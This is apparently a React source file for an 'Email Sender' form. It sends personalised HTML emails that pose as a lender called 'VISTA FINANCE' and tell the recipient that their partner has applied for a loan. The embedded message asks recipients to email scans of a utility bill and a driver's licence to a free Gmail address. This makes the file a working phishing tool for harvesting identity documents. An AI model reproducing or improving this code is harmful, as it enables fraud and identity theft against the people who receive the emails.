import { useState } from "react";
import "./App.css";

function App() {
  const [loading, setLoading] = useState(false);
  const [alert, setAlert] = useState({ show: false, message: "", type: "" });
  const [emailData, setEmailData] = useState({
    to: "",
    userName: "",
    partnerName: "",
  });

  const sendEmail = async () => {
    const { to, userName, partnerName } = emailData;

    if (!to || !userName || !partnerName) {
      setAlert({
        show: true,
        message: "Please fill in all fields",
        type: "error",
      }); // ✅ Show error message using setAlert
      return;
    }

    // ✅ Improved email formatting with inline styles
    const emailBody = `
      <!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Verification Request</title>
  <style>
    body {
      background-color: #121212;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      color: #ffffff;
    }

    .container {
      max-width: 600px;
      margin: 20px auto;
      background-color: #1e1e1e;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.1);
    }

    .header {
      text-align: center;
      padding-bottom: 20px;
      border-bottom: 1px solid #444;
    }

    .header img {
      width: 100%;
      max-width: 500px;
      border-radius: 5px;
    }

    .content {
      padding: 20px;
      text-align: left;
    }

    .content h2 {
      color: #ffcc00;
    }

    .content p {
      font-size: 16px;
      line-height: 1.6;
      color: #ffffff;
    }

     .content li {
        font-size: 16px;
        line-height: 1.6;
        color: #ffffff;
      }

    .footer {
      text-align: center;
      padding-top: 20px;
      font-size: 14px;
      color: #aaaaaa;
    }

    .button {
      display: inline-block;
      background-color: #ffcc00;
      color: #121212;
      padding: 10px 20px;
      text-decoration: none;
      font-weight: bold;
      border-radius: 5px;
      margin-top: 10px;
    }

    .button:hover {
      background-color: #ffaa00;
    }
  </style>
</head>
    <body>
      <div class="container">
        <!-- Header -->
        <div class="header">
          <img src="cid:companylogo" alt="Company Logo"/>
        </div>

        <!-- Content -->
        <div class="content">
          <h2>Dear ${userName},</h2>
          <p>Due to the review on a loan proposal by your partner, <strong>${partnerName}</strong>, with our company and in line with our policy of transparency and integrity, we humbly request a security check on your profile. Your name appears as a holder on the Home Equity account provided to us by your partner (<strong>${partnerName}</strong>).</p>

          <p>In appreciation, we kindly request you to submit the following documents for verification:</p>
          <ul>
            <li>A scanned copy of any recently paid utility bill bearing the name provided by your partner, <strong>${partnerName}</strong>.</li>
            <li>Any government-issued document, such as a <strong>Driver’s License</strong>.</li>
          </ul>
        
          <p><strong>NOTE:</strong> Please ensure that your full name is clearly visible on all verification documents you provide and attach them to your reply for verification.</p>
          <p style="text-align: center;">
            <a href="mailto:biurovistafinance.pl@gmail.com" class="button">Submit Documents</a>
          </p>
          <p>Thank you for your cooperation.</p>
        </div>

        <!-- Footer -->
        <div class="footer">
          <p>&copy; 2025 VISTA FINANCE. All rights reserved.</p>
        </div>
      </div>
    </body>
</html>
    `;

    try {
      setLoading(true);
      const response = await fetch("/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          to,
          subject: "Security Check Request",
          html: emailBody,
        }),
      });
      setTimeout(() => {
        setLoading(false);
        setAlert({
          show: true,
          message: "Message sent successfully!",
          type: "success",
        });
        setEmailData({ to: "", userName: "", partnerName: "" });
      }, 2000);

      const result = await response.json();

      if (response.ok) {
        alert("Email Sent Successfully!");
      } else {
        alert("Error sending email: " + result.message);
      }
    } catch (error) {
      alert("Error sending email: " + error.message);
    }
  };

  return (
    <div className="contact-section">
      {alert.show && (
        <div className={`alert ${alert.type}`}>{alert.message}</div>
      )}
      <div className="contact-container">
        <form className="contact-form">
          <h2 className="contact-title">Email Sender</h2>

          <label className="form-group">
            <span className="field-label">Recipient Email</span>
            <input
              type="email"
              placeholder="Recipient Email"
              value={emailData.to}
              className="field-input"
              onChange={(e) =>
                setEmailData({ ...emailData, to: e.target.value })
              }
            />
          </label>

          <label className="form-group">
            <span className="field-label">Recipient Name</span>
            <input
              type="text"
              placeholder="Recipient Name"
              value={emailData.userName}
              className="field-input"
              onChange={(e) =>
                setEmailData({ ...emailData, userName: e.target.value })
              }
            />
          </label>

          <label className="form-group">
            <span className="field-label">Partner's Name</span>
            <input
              type="text"
              placeholder="Partner's Name"
              value={emailData.partnerName}
              className="field-input"
              onChange={(e) =>
                setEmailData({ ...emailData, partnerName: e.target.value })
              }
            />
          </label>
          <button
            onClick={sendEmail}
            className="field-btn"
            type="submit"
            disabled={loading}
          >
            {loading ? "Sending..." : "Send Email"}
          </button>
        </form>
      </div>
    </div>
  );
}

export default App;
